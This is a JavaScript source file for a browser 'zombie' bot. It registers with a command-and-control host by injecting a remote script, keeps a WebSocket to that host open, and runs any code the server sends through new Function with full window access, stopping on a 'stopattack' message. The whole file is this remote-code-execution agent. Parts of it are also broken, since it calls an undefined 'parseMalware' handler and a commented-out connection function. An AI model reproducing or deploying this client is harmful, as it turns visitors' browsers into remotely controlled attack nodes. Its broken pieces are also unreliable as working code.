

(function($){

var zombie;
var missed_heartbeats =0;
var heartbeat_msg ="--heartbeat--";

function JSZombie(ip,handler){
		//handler for Websocket messages
		this.handler = handler;
		//contact c&c server
		this.makeContact=function(){
			//create script to contact over with SOR
			var script =document.createElement('script');
			script.type = 'text/javascript';
			script.src = 'http://'+ip+'/zombie/register';
			script.id = "zombieconnect";
			$("head:first").append(script);

			//handler for websocket creation
			/*function start_connection(){
				//if connection check is null
				if(this.checker ==null){
					//create check to test for connection at fixed interval
					this.checker = setInterval(function(){
							try{
								//update missed heartbeats
								missed_heartbeats++;
								if(missed_heartbeats>=3)
											throw new Error();
								//message to server zombie is alive
								this.websocket.send("alive");
							}
							catch(e){
								//else destroy socket, lost connection to server
								clearInterval(checker);
								this.checker = null;
								this.websocket.close();
							}
					},5000);
				}

			}

			//handler for heartbeat receival
			function check_connection(heartbeat){
						missed_heartbeats=0;
			}*/
			//create websocket
			this.websocket = WS4Redis({
				uri:'ws://'+ip+'/ws/solo?subscribe-session',
				connected: start_connection,
				receive_message: handler,
				heartbeat_msg: "--heartbeat--",
			});
		}
		//execute code sent from server
		this.execute = function(script){
				code = new Function('args','window',script['code']);
				killHander = code(script['args'],window);
				this.killfct = killHander;
		}
		//stop code execution
		this.kill = function(){
				Promise.resolve(this.killfct).then(function(fct){
					fct();
				});
		}



}

//handler for socket responses
function parseSocketResponse(msg){
	var msgJson = JSON.parse(msg);
	//execute code
	if(msgJson.hasOwnProperty('code')==true){
		zombie.execute(msgJson);

	}
	//stop code
	else if(msgJson.hasOwnProperty('stopattack')==true){
		zombie.kill();
	}


}
//create zombie and connect
zombie = new JSZombie(host,parseMalware);
zombie.makeContact();


})(jQuery);
